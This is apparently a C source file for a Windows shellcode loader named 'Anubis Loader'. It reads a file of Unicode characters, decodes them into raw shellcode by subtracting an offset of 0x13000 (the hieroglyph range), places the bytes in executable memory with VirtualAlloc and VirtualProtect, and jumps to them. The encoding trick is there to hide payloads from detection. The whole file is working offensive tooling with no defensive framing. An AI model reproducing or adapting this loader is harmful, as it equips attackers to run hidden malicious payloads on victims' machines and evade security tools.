#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <stdint.h>

int main(int argc, char* argv[]) {
    printf("=== Anubis Loader ===\n");
    
    FILE* file = fopen(argv[1], "rb");
    if (!file) {
        printf("[!] Failed to open file\n");
        return 1;
    }
    
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);
    
    char* utf8_buffer = malloc(file_size + 1);
    fread(utf8_buffer, 1, file_size, file);
    utf8_buffer[file_size] = '\0';
    fclose(file);
    
    wchar_t* wide_buffer = malloc((file_size + 1) * sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, utf8_buffer, -1, wide_buffer, file_size + 1);
    free(utf8_buffer);
    
    size_t len = 0;
    for (wchar_t* p = wide_buffer; *p; ++p) {
        if ((*p >= 0xD800) && (*p <= 0xDBFF)) {
            ++p;
        }
        len++;
    }
    
    unsigned char* shellcode = malloc(len);
    const uint32_t base_unicode = 0x13000;
    size_t shellcode_index = 0;
    
    for (wchar_t* p = wide_buffer; *p; ++p) {
        uint32_t char_code;
        if ((*p >= 0xD800) && (*p <= 0xDBFF)) {
            wchar_t high_surrogate = *p;
            ++p;
            wchar_t low_surrogate = *p;
            char_code = 0x10000 + ((high_surrogate & 0x3FF) << 10) + (low_surrogate & 0x3FF);
        } else {
            char_code = (uint32_t)*p;
        }
        
        shellcode[shellcode_index] = (unsigned char)(char_code - base_unicode);
        shellcode_index++;
    }
    
    printf("\n[*] Decoded %zu bytes\n", len);
    printf("[*] Shellcode: ");
    for (size_t i = 0; i < (len < 32 ? len : 32); i++) {
        printf("%02X ", shellcode[i]);
    }
    printf("\n\n");
    
    void* exec_mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec_mem, shellcode, len);
    
    DWORD old_protect;
    VirtualProtect(exec_mem, len, PAGE_EXECUTE_READ, &old_protect);
    
    printf("[*] Press Enter to execute...");
    getchar();
    
    void (*shellcode_func)() = (void (*)())exec_mem;
    shellcode_func();
    
    free(shellcode);
    free(wide_buffer);
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    
    return 0;
}
